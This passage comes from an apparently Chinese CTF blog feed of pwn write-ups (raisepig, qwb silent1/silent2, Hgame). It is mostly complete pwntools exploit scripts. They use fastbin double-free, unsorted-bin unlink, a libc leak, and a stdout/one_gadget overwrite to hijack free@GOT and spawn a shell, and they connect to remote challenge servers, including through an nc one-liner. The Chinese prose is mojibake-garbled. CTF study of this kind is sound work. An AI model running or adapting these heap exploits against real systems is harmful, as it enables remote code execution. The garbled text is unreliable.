class="keyword">if</span> shell == <span class="number">0</span>:</span><br><span class="line">p.sendlineafter(<span class="string">'The type of the pig :'</span>,pigtype)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice : '</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice : '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Which pig do you want to eat:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat_all</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice : '</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc addr</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'0'</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'1'</span>,<span class="string">'1'</span>)</span><br><span class="line">eat(<span class="number">0</span>)</span><br><span class="line">eat(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'2'</span>*<span class="number">8</span>,<span class="string">'2'</span>)</span><br><span class="line">visit()</span><br><span class="line">p.recvuntil(<span class="string">'22222222'</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">success(<span class="string">'0x%x'</span> % libc.address)</span><br><span class="line">success(<span class="string">'0x%x'</span> % libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin attack</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'3'</span>,<span class="string">'3'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'4'</span>,<span class="string">'4'</span>)</span><br><span class="line">eat(<span class="number">3</span>)</span><br><span class="line">eat(<span class="number">4</span>)</span><br><span class="line">eat(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">0x9d</span>),<span class="string">'5'</span>)</span><br><span class="line"><span class="comment">#add(0x60,p64(libc.symbols["__malloc_hook"]-0x23),'5')</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'6'</span>,<span class="string">'6'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'7'</span>,<span class="string">'7'</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\x00"</span>*<span class="number">3</span></span><br><span class="line">payload += <span class="number">2</span>*p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0xffffffff</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload,<span class="string">'8'</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0x60,'a'*0x13+p64(one_gadget),'8')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;raisepig&quot;&gt;&lt;a href=&quot;#raisepig&quot; class=&quot;headerlink&quot; title=&quot;raisepig&quot;&gt;&lt;/a&gt;raisepig&lt;/h3&gt;&lt;p&gt;è·Ÿpwnable.twçš„Secret Gardenéå¸¸ä¼¼ã€‚èœå•æœ‰5ä¸ªé€‰é¡¹ï¼š&lt;br&gt;&lt;figu
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>qwb-pwn-silent1&amp;2</title>
    <link href="https://4f-kira.github.io/2018/04/04/qwb-pwn-silent1&amp;2/"/>
    <id>https://4f-kira.github.io/2018/04/04/qwb-pwn-silent1&amp;2/</id>
    <published>2018-04-04T03:04:57.000Z</published>
    <updated>2018-04-12T08:33:41.834Z</updated>
    
    <content type="html"><![CDATA[<p>å¥½èœï¼Œåªåšäº†ä¸€é¢˜ï¼Œæ…¢æ…¢è¡¥~</p><h3 id="silent"><a href="#silent" class="headerlink" title="silent"></a>silent</h3><p>ç¨‹åºæœ‰3ä¸ªåŠŸèƒ½ï¼Œåˆ†åˆ«æ˜¯addï¼Œdeleteå’Œedit</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">add_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%lu"</span>, &amp;size);</span><br><span class="line">  getchar();</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  read_(v3, size);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt;= <span class="number">9</span> &amp;&amp; s[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  s[i] = (<span class="keyword">char</span> *)v3;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨addä¸­å¯ä»¥æ§åˆ¶mallocçš„å¤§å°ã€‚<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">free_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="built_in">free</span>(s[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>freeä¹‹åæ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆï¼Œå¯ä»¥è¿›è¡Œfastbin dupä¿®æ”¹gotï¼Œåœ¨0x601ffaå¤„å‘ç°æ»¡è¶³sizeæ¡ä»¶ï¼Œè¦æ±‚fastbinå¤§å°ä¸º0x60ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">remote_addr = <span class="string">'39.107.32.132'</span></span><br><span class="line">remote_port = <span class="number">10000</span></span><br><span class="line">p = remote(remote_addr,remote_port)</span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(id))</span><br><span class="line"></span><br><span class="line">add(<span class="number">80</span>,<span class="string">'a'</span>*<span class="number">79</span>)</span><br><span class="line">add(<span class="number">80</span>,<span class="string">'b'</span>*<span class="number">79</span>)</span><br><span class="line">add(<span class="number">80</span>,<span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">79</span>,<span class="string">'\x01'</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#a</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#b-&gt;a</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#a-&gt;b-&gt;a</span></span><br><span class="line"></span><br><span class="line">fake_addr = <span class="number">0x601ffa</span></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">payload = p64(fake_addr).ljust(<span class="number">79</span>,<span class="string">'\x01'</span>)</span><br><span class="line">add(<span class="number">80</span>,payload) <span class="comment">#a</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">80</span>,<span class="string">'d'</span>*<span class="number">79</span>) <span class="comment">#b</span></span><br><span class="line">add(<span class="number">80</span>,<span class="string">'e'</span>*<span class="number">79</span>) <span class="comment">#a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'$0'</span>+<span class="string">'\x00'</span>*<span class="number">12</span>+p64(elf.plt[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="number">80</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#delete(6)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼šè¿™é‡Œè¦ç”¨åˆ°editçš„åŠŸèƒ½<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">edit_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(s[v1]);</span><br><span class="line">  read_(s[v1], v2 + <span class="number">1</span>);</span><br><span class="line">  read_(&amp;unk_602120, <span class="number">48L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ€è·¯æ˜¯ï¼šé€šè¿‡editä¿®æ”¹fastbinä¸­çš„fdï¼Œç„¶åä¿®æ”¹ID=0çš„åœ°å€ï¼Œè¿›è¡Œä»»æ„åœ°å€å†™ã€‚</p><p>è„šæœ¬å¦‚ä¸‹ï¼š(ä¸åŠ sleepï¼Œä¸ä¿è¯æ¯æ¬¡éƒ½æˆåŠŸ)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id,content,content2)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(id))</span><br><span class="line">p.send(content)</span><br><span class="line">p.send(content2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x5f</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x5f</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#a</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#b-&gt;a</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x60209d</span>),<span class="string">'\n'</span>) <span class="comment">#ä¿®æ”¹açš„fd</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'c'</span>*<span class="number">0x5f</span>) <span class="comment">#a</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(<span class="number">0x602018</span>)) <span class="comment">#ä¿®æ”¹ID=0çš„åœ°å€ä¸ºfree@got</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x400730</span>),<span class="string">'\n'</span>) <span class="comment">#æ”¹æˆsystem@plt</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="silent2"><a href="#silent2" class="headerlink" title="silent2"></a>silent2</h3><p>å¤§ä½“è·Ÿ1å·®ä¸å¤šï¼Œä¸è¿‡è¿™é‡Œaddé™åˆ¶äº†å¤§å°ï¼Œåªèƒ½0x10æˆ–å¤§äº0x80ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨unsorted binsè¿›è¡Œunlink<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">add_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">0x10</span> &amp;&amp; size &lt;= <span class="number">0x7F</span> ) <span class="comment">//è¿™é‡Œæ”¹äº†</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ€è·¯æ˜¯ï¼šå…ˆç”³è¯·ä¸¤ä¸ª0x100å¤§å°çš„chunkï¼Œç„¶åfreeæ‰ï¼Œå†ç”³è¯·ä¸€ä¸ª0x210çš„chunkï¼Œå°±ä¼šåˆ©æ—§åˆšåˆšfreeå‡ºæ¥é‚£ä¸¤ä¸ªchunkçš„ç©ºé—´ï¼Œä½¿ç”¨editæ„é€ ä¸¤ä¸ªfake chunk(fake chunk1æ˜¯free chunkï¼Œfake chunk2æ˜¯allocated chunk)</p><p>å†æ¬¡delete(4)çš„æ—¶å€™ï¼Œä¼šè§¦å‘unlinkï¼Œæœ€ç»ˆç»“æœæ˜¯<code>p_addr</code>ä½ç½®çš„åœ°å€å°±ä¼šæ”¹å†™æ˜¯<code>&amp;p_addr-0x18</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id,content,content2)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(id))</span><br><span class="line">p.send(content)</span><br><span class="line">p.send(content2)</span><br><span class="line"></span><br><span class="line">list_addr = <span class="number">0x6020C0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'BBBB'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'CCCC'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'DDDD'</span>) <span class="comment">#3 &lt;-</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'EEEE'</span>) <span class="comment">#4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(list_addr+<span class="number">0x18</span><span class="number">-0x18</span>)+p64(list_addr+<span class="number">0x18</span><span class="number">-0x10</span>)+<span class="string">'A'</span>*(<span class="number">0x100</span><span class="number">-0x20</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x210</span><span class="number">-0x100</span>) <span class="comment"># fake chunk</span></span><br><span class="line">add(<span class="number">0x210</span>, payload) <span class="comment">#5 == 3+4</span></span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># double free</span></span><br><span class="line">edit(<span class="number">3</span>,p64(elf.got[<span class="string">'free'</span>]),<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(elf.plt[<span class="string">'system'</span>]),<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'/bin/sh\x00'</span>) <span class="comment">#6</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;å¥½èœï¼Œåªåšäº†ä¸€é¢˜ï¼Œæ…¢æ…¢è¡¥~&lt;/p&gt;
&lt;h3 id=&quot;silent&quot;&gt;&lt;a href=&quot;#silent&quot; class=&quot;headerlink&quot; title=&quot;silent&quot;&gt;&lt;/a&gt;silent&lt;/h3&gt;&lt;p&gt;ç¨‹åºæœ‰3ä¸ªåŠŸèƒ½ï¼Œåˆ†åˆ«æ˜¯addï¼Œdeleteå’Œedit&lt;/p&gt;
&lt;f
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Hgame pwn</title>
    <link href="https://4f-kira.github.io/2018/02/07/Hgame-pwn/"/>
    <id>https://4f-kira.github.io/2018/02/07/Hgame-pwn/</id>
    <published>2018-02-07T05:07:14.000Z</published>
    <updated>2018-03-19T01:26:43.993Z</updated>
    
    <content type="html"><![CDATA[<p>ç»ˆäºè¡¥å®Œäº†Hgameçš„pwnï¼Œå­¦åˆ°å¾ˆå¤šæ–°å§¿åŠ¿ã€‚</p><h3 id="guess-number"><a href="#guess-number" class="headerlink" title="guess_number"></a>guess_number</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"enter your guess:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;nptr);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(&amp;nptr) == a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"OHHHHHHH! u did it !\norz orz orz orz\nhere is your flag:"</span>);</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶å¼€äº†canaryï¼Œä½†æ˜¯åªè¦è¾“å…¥çš„ä¸œè¥¿è¦†ç›–åˆ°éšæœºæ•°ï¼Œåˆ¤æ–­ä¸€æ ·å°±cat flagäº†ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ distance  0xffffd39c 0xffffd4b0</span><br><span class="line">From 0xffffd39c to 0xffffd4b0: 276 bytes, 69 dwords</span><br></pre></td></tr></table></figure></p><p>è®¡ç®—ä¸€ä¸‹è¾“å…¥ä½ç½®å’Œéšæœºæ•°çš„è·ç¦»ï¼Œè¾“å…¥ä¸€å †â€™1â€™ï¼Œ<code>atoi</code>ä¼šå°†è¾“å…¥è½¬æˆ0x7fffffffã€‚é‚£ä¹ˆpayloadï¼š<code>python -c &quot;from pwn import *;print &#39;1&#39;*276+p32(0x7fffffff)&quot; |nc 111.230.149.72 10002</code></p><h3 id="flag-server"><a href="#flag-server" class="headerlink" title="flag_server"></a>flag_server</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"your username length: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">while</span> ( v5 &gt; <span class="number">63</span> || !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"sorry,your username is too LOOOOOOOOONG~~\nplease input again.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"your username length: "</span>);</span><br><span class="line">    <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">      ;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"whats your username?"</span>);</span><br><span class="line">  read_n(&amp;s1, v5);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"admin"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = time(<span class="number">0</span>);</span><br><span class="line">    srand(v3);</span><br><span class="line">    v8 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello admin, please input the key: "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%u"</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 != v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"noooo, you are not the TRUE admin!!!\nwho are you???"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello %s, here is what I want to tell you:"</span>, &amp;s1);</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_8048BF4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>è™½ç„¶é™åˆ¶äº†usernameé•¿åº¦ï¼Œå¯ä»¥è¾“å…¥è´Ÿæ•°ç›´æ¥ç»•è¿‡ï¼Œç„¶åè¾“å…¥ä¸€å¤§å †â€™1â€™ï¼Œå°†v10è¦†ç›–äº†å°±OKã€‚</p><h3 id="zazahui"><a href="#zazahui" class="headerlink" title="zazahui"></a>zazahui</h3><p>ç¥ç»ç—…é¢˜ç›®~<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v0 = fopen(<span class="string">"ad"</span>, <span class="string">"r"</span>);</span><br><span class="line">v1 = fopen(<span class="string">"flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">__isoc99_fscanf(v0, <span class="string">"%s"</span>, &amp;ad);</span><br><span class="line"><span class="keyword">return</span> __isoc99_fscanf(v1, <span class="string">"%s"</span>, &amp;flag);</span><br></pre></td></tr></table></figure></p><p>å¹¿å‘Šè¯å’Œflagéƒ½è¯»åˆ°bssæ®µäº†<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">s = (<span class="keyword">char</span> *)&amp;ad;</span><br><span class="line">v3 = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format, v3);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  getinput((<span class="keyword">int</span>)&amp;s1, <span 